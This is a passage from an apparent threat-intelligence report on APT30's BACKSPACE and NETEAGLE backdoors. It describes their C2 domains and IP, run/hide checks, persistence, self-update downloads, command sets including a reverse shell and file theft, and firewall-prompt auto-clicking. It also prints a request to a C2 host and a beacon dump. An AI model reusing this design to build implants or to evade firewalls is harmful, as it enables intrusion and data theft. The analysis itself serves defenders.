If found, setting "Run Mode" fails; else go to step 12. 12. If the response from the server contains the "runall=1" option, setting "Run Mode" succeeds. If switching to "Run Mode" fails, BACKSPACE reads the registry value PassPath under HKEY_CURRENT_ USER\Software\Microsoft\CurrentHalInf, attempts to terminate the process identified by the registry data, and then exits. If BACKSPACE successfully switches to "Run Mode", the hFlag registry value under HKEY_CURRENT_USER\ Software\Microsoft\CurrentHalInf is deleted.
The victim computer’s hostname and IP are saved. A thread to switch the malware back to "Hidden Mode" is started. The thread runs indefinitely until the MicrosoftSYNoRegExit event gets signaled; once signaled, the thread signals the MicrosoftSYNoRegHaveExit event. In this thread, the malware reads the registry value PassPath under HKEY_CURRENT_USER\Software\Microsoft\CurrentHalInf, attempts to terminate the process identified by the registry data, and then exits. Similar to switching to “Run mode” BACKSPACE conducts a series of checks to attempt to switch to "Hidden Mode": 1.
Make an HTTP request to www.iapfreecenter[.]com/Lnk1z/hostlist.txt and validate that the last byte of the response is 0xFF. 2. Make an HTTP request to the legitimate URL automation.whatismyip[.]com/n09230945.asp to obtain the external IP of the victim computer. 3. Make an HTTP request to either www.newpresses[.]com/some/edih.txt, www.km153[.]com/ some/edih.txt or www.appsecnic[.]com/some/edih.txt and validate that the response starts with "abcd1234"; if none of the servers respond accordingly, setting "Hidden Mode" fails.
4. If the response from the server contains the "killpath=" option, write the option data to the registry value PassPath under HKEY_CURRENT_USER\Software\Microsoft\CurrentHalInf; this data represents the path of a process to be terminated. 5. If the response from the server contains the "hidehost=" option, search for the victim computer’s hostname in the option data. If found, setting "Hidden Mode" succeeds; else go to step 5.
6. If the response from the server contains the "hidehostexcept=" option, search for the victim computer’s hostname in the option data. If found, setting "Hidden Mode" fails; else go to step 6. 7. If the response from the server contains the "hideip=" option, search for the victim computer’s external IP (obtained in step 2) in the option data.
If found, setting "Hidden Mode" succeeds; else go to step 7. 8. If the response from the server contains the "hideipexcept=" option, search for the victim computer’s external IP (obtained in step 2) in the option data. If found, setting "Hidden Mode" fails; else go to step 8. 9.
If the response from the server contains the "hidedir=" option, search for the current C2 URL (e.g., www.iapfreecenter[.]com/Lnk1z or www.appsecnic[.]com/Lnk1z) in the option data. If found, setting "Hidden Mode" succeeds; else go to step 9. 10. If the response from the server contains the "hidedirexcept=" option, search for the current C2 URL in the option data. If found, setting "Hidden Mode" fails; else go to step 10.
11. If the response from the server contains the "hideweb=" option, search for the current C2 domain (e.g., www.iapfreecenter[.]com or www.appsecnic[.]com) in the option data. If found, setting "Hidden Mode" succeeds; else go to step 11. 12. If the response from the server contains the "hidewebexcept=" option, search for the current C2 domain in the option data.
If found, setting “Hidden Mode" fails; else go to step 12. 13. If the response from the server contains the "hideall=1" option, setting "Hidden Mode" succeeds. If BACKSPACE successfully switches to "Hidden Mode" succeeds, the hFlag registry value under HKEY_ CURRENT_USER\Software\Microsoft\CurrentHalInf is created and set to 1. The malware stores the hostname of the victim computer’s primary Domain Controller to be sent to the second stage C2 server as part of the host details data.
Primary vs Backup C2 Domains BACKSPACE sends an HTTP request to www.appsecnic[.]com/Lnk1z/bak.txt. If the response starts with "qazWSX123$%^", it sets the primary C2 URL domain to www.appsecnic[.]com. Download Additional Files BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /Lnk1z/app.txt and saves the file to <CSIDL_PROGRAMS>\Messenger\BIN\Temp.txt. Next, the downloaded file is copied to <CSIDL_PROGRAMS>\Messenger\BIN as MessengerPlug.exe and if it is a valid PE file, a new process is started. In addition, BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path / Lnk1z/hostlist.txt.
If the victim computer’s hostname is found in the response, BACKSPACE makes a new HTTP request to the primary C2 URL domain and URL path /Lnk1z/myapp.txt and saves the file to <CSIDL_PROGRAMS>\Messenger\BIN\Temp.txt. Next, the downloaded file is copied to <CSIDL_ PROGRAMS>\Messenger\BIN as MessengerForVista.exe and if it is a valid PE file, a new process is started. BACKSPACE will then delete the following files: <CSIDL_PROGRAMS>\Messenger\BIN\Temp.txt <CSIDL_PROGRAMS>\Messenger\BIN\UpdateMessenger.exe <CSIDL_PROGRAMS>\Messenger\BIN\MessengerPlug.exe <CSIDL_PROGRAMS>\Messenger\BIN\MessengerForVista.exe Self-Update Mechanism BACKSPACE performs the following update tasks: 1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain and URL path /Lnk1z/ver.txt; if the version returned does not match the version of the current binary ("2.00MSNN" for this sample), go to step 2. 2.
Download a new binary by making an HTTP request to the primary C2 URL domain and URL path / Lnk1z/exe.txt and saving the file to <CSIDL_PROGRAMS>\Messenger\BIN\Temp.txt. 3. Copy <CSIDL_PROGRAMS>\Messenger\BIN\Temp.txt to <CSIDL_PROGRAMS>\Messenger\BIN as UpdateMessenger.exe. 4. If <CSIDL_PROGRAMS>\Messenger\BIN\UpdateMessenger.exe is a valid PE, start a new process.
If the previous update task fails, BACKSPACE performs a new update task: 1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain and URL path /Lnk1z/SomeUpVer.txt; if the version returned does not match the version of the current binary, go to step 2. 2. Make an HTTP request to the primary C2 URL domain and URL path /Lnk1z/SomeUpList.txt and validate that the victim computer’s host name is in the response; if true, go to step 3. 3.
Download a new binary by making an HTTP request to the primary C2 URL domain and URL path / Lnk1z/SomeUpExe.txt and saving the file to <CSIDL_PROGRAMS>\Messenger\BIN\Temp.txt. 4. Copy <CSIDL_PROGRAMS>\Messenger\BIN\Temp.txt to <CSIDL_PROGRAMS>\Messenger\BIN as UpdateMessenger.exe. 5. If <CSIDL_PROGRAMS>\Messenger\BIN\UpdateMessenger.exe is a valid PE, start a new process.
Second Stage C2 Server Next, BACKSPACE makes an HTTP request to the primary C2 URL domain and URL path /Lnk1z/ dizhi.gif. Dizhi.gif is a 10-byte configuration file that specifies an IP address and three port numbers. Figure 23: Second stage C2 server information in dizhi.gif BACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP, SystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain, and information about the logical drives) to Port1 on the new C2 server. The malware will use the victim computer’s saved proxy settings if needed. The data is sent using an HTTP POST request to the URL path /index.htm.
BACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary C2 URL domain. If the victim computer’s hostname and hostid are found in the file, the victim will attempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to directly interact with the victim via the BACKSPACE controller. After establishing the connection to the controller, BACKSPACE awaits further interactive commands from the operator. For this copy of BACKSPACE, the following commands are supported: IP: 112.117.9.222 Port1: 443 Port2: 443 Port3:82  Table 8: Commands supported by BACKSPACE "ZJ" variant 8c713117af4ca6bbd69292a78069e75b Command Meaning A Same as J or S, but the file is deleted from the victim computer after transmission. B Receive a folder and list of filenames from the C2 server; search the folder for the specified files (can use wildcards).
For each file found, upload the encoded WIN32_FIND_DATA32 structure to the C2 server. C Collects information about running processes (process name, process full path, owner account name, processID, thread count). D Receive a folder path, a list of files, and a flag byte for each file from the C2 server. Delete files for which the flag is 0x30 and remove empty folders. E Receive a file path, access byte (0 for WRITE, else APPEND) and encoded data from the C2 server.
Open the file according to the access byte, decode the data, and write it to the file. F Receive a Process ID (PID) from the C2 server; elevates privileges (SeTakeOwnershipPrivilege) of the process identified by the PID and terminate it. G Receive a path from the C2 server; create a file for writing. H Receive a path from the C2 server; create a folder. I Receive two paths from the C2 server; perform a file rename operation.
J Receive a file path and offset from the C2 server. Read the file starting at the specified offset, encode the data, and send it to the C2 server. K Receive a PID from the C2 server; terminate the process identified by the PID. M Receive a path and a set of file attributes from the C2 server; apply the attributes to the file specified by the path. N Receive a path to a folder from the C2 server; read the content of all the files from the folder and all sub-folders and upload their content after receiving acknowledgement from the C2 server.
R Receive a command line string from the C2 server and create a new process using the command. S Same as J. T Creates a reverse shell with redirected std input/output/error to pipes. U Delete MSN.lnk from the <CSIDL_STARTUP> folder. V Same as E, but the file is created in the folder <CSIDL_TEMPLATES> and executed.
W Enumerate network resources on the victim computer. X Restart the C2 cycle from the self-update process (perform update, obtain secondary C2 details, send host details, receive commands, etc.). Y Receive a list of filenames from the C2 server. Delete the file LwxRsv.tem in <CSIDL_TEMPLATES>; find the set of filenames specified by the C2 server; write the Name, LastWriteTime, nFileSizeLow for each file to LwxRsv.tem; send the content of this file to the C2 server and delete it. Z “Cancel” command; sends *lecnaC* to the C2 server.
a Receive a registry key path from the C2 server; enumerate the registry values in the registry key and send the collected data to the C2 server. b Receive a registry key path from the C2 server; create the specified registry key. c Receive a registry value path, name, type, data, and size from the C2 server; create the specified registry value. d Receive a registry key path from the C2 server; delete the registry key and all its sub-keys. e Receive a registry value path from the C2 server; delete the registry value.
f Same as a command. After each command is processed, BACKSPACE sends a status message to the C2 server: A message starting with "O" indicates success. A message starting with "E" indicates failure. BACKSPACE BACKDOOR – “ZR” VARIANT The “ZR” branch of the BACKSPACE malware represents a later fork of the original “ZJ” version. Many “ZR” variants appear to be streamlined; that is, they may support a subset of the commands used by other BACKSPACE versions (both “ZJ” and “ZR” variants are compatible with the BACKSPACE controller; any non-supported commands simply ignored by the BACKSPACE client).
However, some “ZR” variants include new features not seen in other versions of the backdoor, such as the ability to bypass host-based firewall software.33 The BACKSPACE “ZR” variant with md5 hash 6ee35da59f92f71e757d4d5b964ecf00 was compiled on 28 August 2014. While this sample may include features not present in other (or earlier) versions of BACKSPACE, much of the malware’s core functionality (such as the use of first-stage and second-stage C2 locations) has not changed significantly over time. As a recent example of the BACKSPACE malware family, this sample gives us both an overview of BACKSPACE’s functionality as well as a look at some of the malware’s “current” features in the ZR branch. Initial Execution BACKSPACE creates the mutex MicrosoftZjZRLnk to ensure that only one instance is executing at any given time. It also creates two events (MicrosoftZjZRLnkExit and MicrosoftZjZRLnkHaveExit) that, when signaled, trigger all the threads and the malware itself to exit.
The malware extracts system information (OS version, build number, platform, service pack, default language id) and proxy information (from the ProxyEnable and ProxyServer values under HKEY_ CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\) from the victim host. BACKSPACE then creates the registry values lnk (type REG_SZ) and hostid (type REG_DWORD) under the HKEY_CURRENT_USER\Software\Microsoft\CurrentPnpSetup registry key: lnk is set XJOXPSE/mol which is the encoded text WINWORD.lnk hostid is set to a random value (used to uniquely identify a victim host). The malware then creates the directories <CSIDL_PROFILE>\Microsoft Office and <CSIDL_PROFILE>\ Microsoft Office\BIN. The malware is copied to a temporary file whose path is obtained by appending the .txt file extension to the current malware path and file name. The temporary file then is copied to the newly created folder <CSIDL_PROFILE>\Microsoft Office\BIN as WINWORD.exe and the original temporary file is deleted.
For persistence, BACKSPACE creates the Windows shortcut file WINWORD.lnk in <CSIDL_STARTUP> or <CSIDL_COMMON_STARTUP> pointing to <CSIDL_PROFILE>\Microsoft Office\ BIN\WINWORD.EXE with the description "Microsoft Office Word". C2 Domains Like many BACKSPACE variants, this “ZRLnk” sample is configured with four different C2 domains. The C2 domains are used in HTTP requests for various files; each file requested via the URI provides additional instructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes – that is, each domain is associated with different URIs whose associated files support different functions. For this sample, the four C2 domains have the following roles: Domain 1 (D1): www.bigfixtools[.]com.
This is the primary first-stage C2 domain, used with the majority of the URIs (and their associated functions). Domain 2 (D2): (www.km153[.]com) is the backup C2 domain, which can be promoted to the primary first-stage domain instead of D1 if necessary. It also can be used to obtain “run/hide” configuration data (see below). Domain 3 (D3) and Domain 4 (D4) (www.km-nyc[.]com and www.bluesixnine[.]com, respectively) are used to obtain “run/hide” configuration data. The C2 domains used by APT30 is a single malware sample range from the “brand new” to more “historical” domains that have been in existence (and use) for several years.
For reference, sample 6ee35da59f92f71e757d4d5b964ecf00 was compiled on 8/28/2014 at 09:12:33 GMT; the spear phishing attacks that dropped this BACKSPACE variant occurred on 8/29/2014. Table 9: BACKSPACE C2 domains and registration dates. Alias C2 Domain Description Zone Registration Date D1 www.bigfixtools[.]com Primary C2 domain 8/26/2014 D2 www.km153[.]com Backup C2 domain; run/hide configuration 8/30/2007 D3 www.bluesixnine[.]com Run/hide configuration 12/4/2012 D4 www.km-nyc[.]com Run/hide configuration 3/11/2004 “Run” vs “Hide” Mode BACKSPACE reads the registry value hFlag under HKEY_CURRENT_USER\Software\Microsoft\ CurrentPnpSetup. If it exists and is set to 1, the malware switches to "Run Mode"; otherwise, the malware operates in "Hidden Mode". To switch to “Run mode”, BACKSPACE attempts to contacts its C2 servers for validation and to obtain configuration data (stored in a file named nur.txt).
It parses the configuration data and performs a series of increasingly generic checks to see whether (by inclusion or exclusion) it should remain in “Run mode”. The methodology is the same as described for the “ZJ” sample above, differing only in the C2 domains used and the specific URI paths requested. 1. Make an HTTP request to www.bigfixtools.com/ForZRLnk3z/hostlist.txt and validate that the last byte of the response is 0xFE. 2.
Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to obtain the external IP address of the victim host. 3. Make an HTTP request to either www.bluesixnine.com/http/nur.txt, www.km153.com/ http/nur.txt or www.km-nyc.com/http/nur.txt and validate that the response starts with "abcd1234"; if none of the servers respond accordingly, setting "Run Mode" fails. 4. If the response from the server contains the "runhost=" option, search for the victim computer’s hostname in the option data.
If found, setting "Run Mode" succeeds; else go to step 5. 5. If the response from the server contains the "runhostexcept=" option, search for the victim computer’s hostname in the option data. If found, setting "Run Mode" fails; else go to step 6. 6.
If the response from the server contains the "runip=" option, search for the victim computer’s external IP (obtained in step 2) in the option data. If found, setting "Run Mode" succeeds; else go to step 7. 7. If the response from the server contains the "runipexcept=" option, search for the victim computer’s external IP (obtained in step 2) in the option data. If found, setting "Run Mode" fails; else go to step 8.
8. If the response from the server contains the "rundir=" option, search for the current C2 URL (e.g., www.bigfixtools[.]com/ForZRLnk3z or www.km153[.]com/ForZRLnk3z) in the option data. If found, setting "Run Mode" succeeds; else go to step 9. 9. If the response from the server contains the "rundirexcept=" option, search for the current C2 URL in the option data.
If found, setting "Run Mode" fails; else go to step 10. 10. If the response from the server contains the "runweb=" option, search for the current C2 domain (e.g., www.bigfixtools.com) in the option data. If found, setting "Run Mode" succeeds; else go to step 11. 11.
If the response from the server contains the "runwebexcept=" option, search for the current C2 domain in the option data. If found, setting "Run Mode" fails; else go to step 12. 12. If the response from the server contains the "runall=1" option, setting "Run Mode" succeeds. If switching to "Run Mode" fails, the malware exits.
Once the malware switches to "Run Mode" the hFlag registry value under HKEY_CURRENT_USER\ Software\Microsoft\CurrentPnpSetup is deleted and the victims’ hostname and IP are saved. A thread to switch the malware back to "Hidden Mode" is started. The thread runs indefinitely until the MicrosoftZjZRLnkExit event gets signaled; once signaled, the thread signals MicrosoftZjZRLnkHaveExit event, does clean-up and exits. Similar to switching to “Run mode” BACKSPACE conducts a series of checks to attempt to switch to "Hidden Mode". The methodology is the same as described for the “ZJ” sample above, differing only in the C2 domains used and the specific URI paths requested.
1. Make an HTTP request to www.bigfixtools.com/ForZRLnk3z/hostlist.txt and validate that the last byte of the response is 0xFF. 2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to obtain the external IP address of the victim host. 3.
Make an HTTP request to either www.bluesixnine.com/some/edih.txt, www.km153.com/ some/edih.txt or www.km-nyc.com/some/edih.txt and validate that the response starts with "abcd1234"; if none of the servers respond accordingly, setting "Hidden Mode" fails. 4. If the response from the server contains the "hidehost=" option, search for the victim computer’s hostname in the option data. If found, setting "Hidden Mode" succeeds; else go to step 5. 5.
If the response from the server contains the "hidehostexcept=" option, search for the victim computer’s hostname in the option data. If found, setting "Hidden Mode" fails; else go to step 6. 6. If the response from the server contains the "hideip=" option, search for the victim computer’s external IP (obtained in step 2) in the option data. If found, setting "Hidden Mode" succeeds; else go to step 7.
7. If the response from the server contains the "hideipexcept=" option, search for the victim computer’s external IP (obtained in step 2) in the option data. If found, setting "Hidden Mode" fails; else go to step 8. 8. If the response from the server contains the "hidedir=" option, search for the current C2 URL (e.g., www.bigfixtools[.]com/ForZRLnk3z or www.km153[.]com/ForZRLnk3z) in the option data.
If found, setting "Hidden Mode" succeeds; else go to step 9. 9. If the response from the server contains the "hidedirexcept=" option, search for the current C2 URL (e.g., www.bigfixtools[.]com/ForZRLnk3z or www.km153[.]com/ForZRLnk3z) in the option data. If found, setting "Hidden Mode" fails; else go to step 10. 10.
If the response from the server contains the "hideweb=" option, search for the current C2 domain (e.g., www.bigfixtools[.]com or www.km153[.]com) in the option data. If found, setting "Hidden Mode" succeeds; else go to step 11. 11. If the response from the server contains the "hidewebexcept=" option, search for the current C2 domain (e.g., www.bigfixtools[.]com or www.km153[.]com) is searched in the option data; if found, setting "Hidden Mode" fails; else go to step 12. 12.
If the response from the server contains the "hideall=1" option, setting "Hidden Mode" succeeds. If switching to "Hidden Mode" succeeds, the hFlag registry value under HKEY_CURRENT_USER\Software\ Microsoft\CurrentPnpSetup is created and set to 1. If BACKSPACE is successfully placed in “Run mode” it performs the following additional tasks: Primary vs Backup C2 Domains The malware sends an HTTP request to www.km153[.]com/ForZRLnk3z/bak.txt. If the response starts with "qazWSX123$%^", set the primary C2 domain to www.km153[.]com. Download Additional Files BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/app.
txt and saves the file to the path <CSIDL_PROFILE>\Microsoft Office\BIN\WordPlug.exe. If the downloaded file is a valid PE file, start a new process. Next, BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/ hostlist.txt. If the victim computer’s hostname is found in the response, BACKSPACE sends a new HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/myapp.txt and saves the file to the path <CSIDL_PROFILE>\Microsoft Office\BIN\WordForVista.exe. If the downloaded file is a valid PE file, start a new process.
BACKSPACE then deletes the following files: <CSIDL_PROFILE>\Microsoft Office\BIN\Temp.txt <CSIDL_PROFILE>\Microsoft Office\BIN\UpdateWord.exe <CSIDL_PROFILE>\Microsoft Office\BIN\WordPlug.exe <CSIDL_PROFILE>\Microsoft Office\BIN\WordForVista.exe Self-Update Mechanism BACKSPACE uses version control and will attempt to verify the current version and perform a selfupdate as follows: 1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain (www.bigfixtools[.]com or www.km153[.]com) and URL path /ForZRLnk3z/ver.txt; if the version returned does not match the version of the current binary ( "1.9.w.lY" for this sample), go to step 2 2. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/exe.txt and saving the file to <CSIDL_PROFILE>\Microsoft Office\BIN\ UpdateWord.exe. 3. If <CSIDL_PROFILE>\Microsoft Office\BIN\UpdateWord.exe is a valid PE, start a new process.
If the previous update task fails, BACKSPACE performs a secondary update task: 1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpVer.txt; if the version returned does not match the version of the current binary, go to step 2. 2. Make an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpList.txt and validate that the victim computer’s hostname is in the response; if true, go to step 3. 3.
Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpExe.txt and saving the file to <CSIDL_PROFILE>\Microsoft Office\BIN\ UpdateWord.exe. 4. If <CSIDL_PROFILE>\Microsoft Office\BIN\UpdateWord.exe is a valid PE, start a new process. BACKSPACE uses the same mutex (MicrosoftZjZRLnk), and event names (MicrosoftZjZRLnkExit, MicrosoftZjZRLnkHaveExit) across different versions of the same variant. Thus, the malware can remove the previous version and update to a newer version while ensuring that only one instance of the same backdoor family is installed on a given host.
Figure 24: Second stage C2 server information in dizhi.gif When the malware is updated, the randomly generated hostid from the initial infection (stored in the registry) is not changed. From the attacker’s perspective, this allows the “identity” of the victim host to remain consistent, even across multiple version updates. Second Stage C2 Server Next, BACKSPACE makes an HTTP request to the primary C2 URL domain (www.bigfixtools[.]com or www.km153[.]com) and URL path /ForZRLnk3z/dizhi.gif. Dizhi.gif is a 10-byte configuration file that specifies an IP address and two port numbers. BACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP, SystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain, and information about the logical drives) to Port1 on the new C2 server.
The malware will use the victim computer’s saved proxy settings if needed. The data is sent using an HTTP POST request with the following structure:  A sample beacon is shown below. Note that the HTTP User-Agent header is set to the non-standard value “SJZJ (compatible; MSIE 6.0; Win32)”. Figure 25: Sample BACKSPACE callback message Table 10: BACKSPACE “ZRLnk” callback structure Offset Value Description 0x00 0x30 fixed (1 byte message identifier; 0x30 = ascii 0)) 0x01 fd 00 00 00 data length = 253 bytes (4 byte length) 0x05 - computer name (varying length), 0x00 0x14 192.168.43.130, 0x00 IP Address (varying length), 0x00 0x23 253 version information (156 bytes) 0xBF 04 08 language ID (2 bytes) 0xC1 00 proxy on/off (1 byte) 0xC2 41 18 00 00 host_id (4 bytes) 0xC6 1.9.w.lY version string (varying length) 0xCE (Proxy-No), 0x00 proxy setting (varying length), 0x00 0xD9 0:7, 0x00 system uptime - H:M (varying length), 0x00 0xDD www.bigfixtools.com/ForZRLnk3z, 0x00 URL where the second C2 IP is obtained(varying length), 0x00  BACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary C2 URL domain. If the victim computer’s hostname and hostid are found in the file, the victim will attempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to directly interact with the victim via the BACKSPACE controller.35 After establishing the connection to the controller, BACKSPACE awaits further interactive commands from the operator.
For this copy of BACKSPACE, the following commands are supported: Table 11: Commands supported by BACKSPACE "ZRLnk" variant 6ee35da59f92f71e757d4d5b964ecf00 Command Meaning A Same as J or S, but the file is deleted from the victim computer after transmission. B Receive a folder and list of filenames from the C2 server; search the folder for the specified files (can use wildcards). For each file found, upload the encoded WIN32_FIND_ DATA36 structure to the C2 server. D Receive a folder path, a list of files, and a flag byte for each file from the C2 server. Delete files for which the flag is 0x30 and remove empty folders.
E Receive a file path, access byte (0 for WRITE, else APPEND) and encoded data from the C2 server. Open the file according to the access byte, decode the data, and write it to the file. J Receive a file path and offset from the C2 server. Read the file starting at the specified offset, encode the data, and send it to the C2 server. R Receive a command line string from the C2 server and create a new process using the command.
S Same as J. V Same as E, but the file is created in the folder <CSIDL_TEMPLATES> and executed. X Restart the C2 cycle from the self-update process (perform update, obtain secondary C2 details, send host details, receive commands, etc.). Z “Cancel” command; sends *lecnaC* to the C2 server. After each command is processed, BACKSPACE sends a status message to the C2 server; messages starting with “O” indicate success, messages starting with “E” indicate failure.
Configuration and C2 Encoding While earlier versions of BACKSPACE may contain the C2 domains and other variables in plain text within the binary, they are encoded within this (and other more recent) variants. Decoding is done in two ways: by adding an incremental counter, or by XORing and bitwise shifting bytes. Host-Based Firewall Bypass This variant of BACKSPACE includes functionality to attempt to bypass a number of personal firewall applications. BACKSPACE iterates through open windows and matches the type (Button) and its associated Window Text against a set of strings stored within the malware. If a match is found, BACKSPACE sends a message to simulate a mouse click, attempting to “approve” firewall rules to allow the malware to execute.
Both English and Chinese strings are stored, implying that the malware attempts to target versions of the products below that are localized for those languages.37 Table 12: Strings used in attempt to bypass host-based firewalls Security Product Meaning Avira Note action selected for this file (dangerous) 请注意为此文件选择的操作(危险) F-Secure I trust the program. Let it continue. 我信任该程序。继续执行。 Do not show this dialog for this program again 不再为此程序显示此对话框 AVG Firewall Save my answer as a permanent rule, and do not ask me next time 将我的回答作为永久规则保存下来，下次不再询问。 Sophos Firewall Add the checksum to existing checksums for this application 将此应用程序的检查和添加到现有的检查和中。 Allow all hidden processes launched by 启动的所有隐藏进程访问网络 Panda Security Always allow the connection 总是允许此连接 TPSVARadioBtn, TPSVAButton McAfee McXpBtn2, McAlertButtonClass Others Trust 信任 Ignore 忽略 Allow 允许 Allow (recommended) 允许 (推荐) OK 确定 Remember this action 总是允许 Do not show this message again before rebooting Grant access Allow this change 运行  NETEAGLE BACKDOOR – “SCOUT” VARIANT The NETEAGLE backdoor appears to have been developed after BACKSPACE, with early NETEAGLE samples dating to 2008. The “Scout” variant (named for the mutex “Neteagle_Scout” used by this version) was the earlier of the two. While NETEAGLE shares some similarities with BACKSPACE, including retrieval of commands from specific URIs, automatic updating, and a two-stage command and control structure, NETEAGLE typically uses a single C2 domain (instead of up to four used by BACKSPACE) and supports a more limited set of URIs for command retrieval.
In addition, NETEAGLE supports an entirely different set of commands than BACKSPACE; it is not compatible with the BACKSPACE controller and is presumed to have its own separate controller software. Later variants of NETEAGLE (e.g., the “Norton” versions) also support a modular “plugin” framework that allows the backdoor to load and execute DLLs for additional functionality. The NETEAGLE sample 3feef9a0206308ee299a05329095952a was compiled on 9 April 2009. The malware creates the directory C:\Program Files\Messenger\ and copies itself to that directory as msmsgr.exe. NETEAGLE also creates the following registry value for persistence: Value: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\msmsgr Data: C:\Program Files\Messenger\msmsgr.exe NETEAGLE first attempts to retrieve the file allupdate.xml using the following HTTP request: GET /yzstmfa/allupdate.xml HTTP/1.1 User-Agent: [filename of malware] Host: www.autoapec.com Cache-Control: no-cache The file is saved to %DEFAULTUSERPROFILE%\ieupdate.exe and executed.
NETEAGLE then downloads hxxp://www.autoapec[.]com/yzstmfa/update.xml and decrypts the file with the RC4 key "ScoutEagle". In the decrypted result, the malware looks for the hostname of the system. If the hostname is present, the malware downloads hxxp://www.autoapec[.]com/yzstmfa/updateapp. xml, saves it to %DEFAULTUSERPROFILE%\visit.exe and executes the file. Once the initial update URLs are downloaded, the malware creates the mutex "NetEagle_Scout" and begins the process of obtaining the second-stage C2 IP address(es) and port.
NETEAGLE downloads the URL hxxp://www.autoapec[.]com/yzstmfa/pic1.bmp and RC4 decrypts the first four bytes of the response using the key "ScoutEagle". The decrypted bytes are a callback IP. If the victim computer is not configured to use a proxy, the malware sends a 363 byte UDP beacon to port 6000 on the decrypted IP. If a proxy is enabled, the malware sends the same 363 byte beacon using the following HTTP POST request: Figure 30: NETEAGLE 'Scout' sample beacon POST /index.htm HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Win32) Host: [Callback IP] Content-Length: 363 Connection: Keep-Alive Cache-Control: no-cache 00000000 a3 0b cf 8b f9 56 ed bc be 0f 8b 6d b8 35 db 26 .....V.. ...m.5.& 00000010 57 37 58 36 34 5f 41 4e 41 4c 59 53 49 53 00 c0 W7X64_AN ALYSIS..
00000020 a8 38 6f 00 00 00 00 32 2e 31 38 00 69 6e 64 6f .8o....2 .18.indo 00000030 77 73 20 58 50 20 36 2e 31 20 42 75 69 6c 64 37 ws XP 6. 1 Build7 00000040 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 6b 601 Serv ice Pack 00000050 20 31 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1...... ........ 00000060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........
00000070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........ 00000080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........ 00000090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........
........ 000000A0 00 00 00 00 00 00 00 00 00 00 00 32 30 31 35 2d ........ ...2015- 000000B0 32 2d 32 20 31 37 3a 34 3a 33 32 00 00 00 00 00 2-2 17:4 :32..... 000000C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........
000000D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........ 000000E0 00 00 00 00 00 00 00 00 00 00 00 52 45 00 00 00 ........ ...RE... 000000F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........
........ 00000100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........ 00000110 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........
00000120 00 00 00 00 00 00 00 00 00 00 00 32 30 34 37 20 ........ ...2047 00000130 4d 42 00 00 00 00 00 00 00 00 00 00 00 00 00 00 MB...... ........ 00000140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........
00000150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........ 00000160 00 00 00 00 00 00 00 00 00 00 00 ........ ... The POST data consists of the following: Table 13: NETEAGLE beacon contents Data Meaning a30bcf8bf956edbcbe0f8b6db835db26 Nd5 hash of the callback URL (http://www.autoapec[.]com/ yzstmfa/pic1.bmp) W7X64_ANALYSIS Hostname of victim computer c0 a8 38 6f IP address of victim computer 2.18 Malware version Winows XP 6.1 Build7601 Service Pack 1 OS Version (truncated 'W') 2015-2-2 17:4:32 Date / time from victim computer RE Active username from victim computer 2047 MB Amount of memory on victim computer  NETEAGLE then requests the URL hxxp://www.autoapec.com/yzstmfa/pic2.bmp.
The response is expected to be less than 0x17 bytes (additional data, if received, is ignored) and is decrypted using the RC4 key “ScoutEagle”. The decrypted response consists of the following data: [Hostname (up to 15 bytes)]\x00[IP address in network byte order][Port] If the hostname of the victim computer is listed in the decrypted response, the malware initiates a TCP connection to the specified IP and port. This session is not encrypted. The C2 protocol consists of a 4 byte DWORD command ID. If the command ID takes an argument, a 4 byte DWORD identifying the length of the argument is sent.
